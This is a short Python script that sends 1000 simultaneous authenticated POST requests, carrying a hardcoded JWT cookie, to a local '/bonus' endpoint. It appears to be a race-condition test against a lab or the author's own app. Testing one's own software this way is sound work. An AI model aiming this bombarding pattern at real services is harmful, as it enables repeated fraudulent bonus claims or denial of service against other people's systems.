import asyncio
from random import randint
import aiohttp

async def send_post_request(url, cookies):
    async with aiohttp.ClientSession() as session:
        async with session.post(url, cookies=cookies) as response:
            return await response.text()


async def main(target_utl, cookie):
    print(f"Start Bombarding url={target_utl}, cookie={cookie}")
    cookie_param = {'jwt': cookie}
    async with asyncio.TaskGroup() as tg:
        for i in range(1000):
            tg.create_task(send_post_request(target_utl, cookie_param))


if __name__ == "__main__":
    asyncio.run(
        main(
            'http://localhost:8081/bonus',
            'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NDQyMTYxMjUsInVzZXJfaWQiOjd9.a5K5p7FqDVDDwp0VP48KyCbr3XVLqMF5Er5z_6SUHP4'
        )
    )